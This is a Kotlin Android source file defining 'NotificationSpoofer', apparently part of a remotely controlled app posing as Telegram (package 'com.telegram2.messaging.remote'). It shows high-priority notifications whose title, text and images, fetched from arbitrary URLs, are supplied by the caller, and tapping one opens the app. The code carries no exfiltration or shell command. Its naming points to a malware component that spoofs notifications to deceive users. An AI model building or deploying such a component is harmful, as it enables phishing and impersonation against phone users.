package com.telegram2.messaging.remote

import android.app.NotificationChannel
import android.app.NotificationManager
import android.app.PendingIntent
import android.content.Context
import android.content.Intent
import android.graphics.Bitmap
import android.graphics.BitmapFactory
import android.os.Build
import androidx.core.app.NotificationCompat
import java.net.URL

object NotificationSpoofer {
    fun show(context: Context, title: String, text: String, iconUrl: String?, bigPictureUrl: String?) {
        val channelId = "spoof"
        val manager = context.getSystemService(Context.NOTIFICATION_SERVICE) as NotificationManager

        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            manager.createNotificationChannel(
                NotificationChannel(channelId, "Spoof", NotificationManager.IMPORTANCE_HIGH)
            )
        }

        val builder = NotificationCompat.Builder(context, channelId)
            .setSmallIcon(android.R.drawable.ic_dialog_alert)
            .setContentTitle(title)
            .setContentText(text)
            .setAutoCancel(true)
            .setPriority(NotificationCompat.PRIORITY_HIGH)

        // Download images in background
        Thread {
            var largeIcon: Bitmap? = null
            var bigPicture: Bitmap? = null
            try {
                if (!iconUrl.isNullOrEmpty()) {
                    largeIcon = BitmapFactory.decodeStream(URL(iconUrl).openConnection().getInputStream())
                }
                if (!bigPictureUrl.isNullOrEmpty()) {
                    bigPicture = BitmapFactory.decodeStream(URL(bigPictureUrl).openConnection().getInputStream())
                }
            } catch (_: Exception) {}

            // Apply on main thread
            android.os.Handler(context.mainLooper).post {
                if (largeIcon != null) builder.setLargeIcon(largeIcon)
                if (bigPicture != null) {
                    val style = NotificationCompat.BigPictureStyle()
                        .bigPicture(bigPicture)
                        .bigLargeIcon(null as Bitmap?)
                    builder.setStyle(style)
                }
                val intent = context.packageManager.getLaunchIntentForPackage(context.packageName)
                val pendingIntent = PendingIntent.getActivity(context, 0, intent, PendingIntent.FLAG_IMMUTABLE)
                builder.setContentIntent(pendingIntent)
                manager.notify(999, builder.build())
            }
        }.start()
    }
}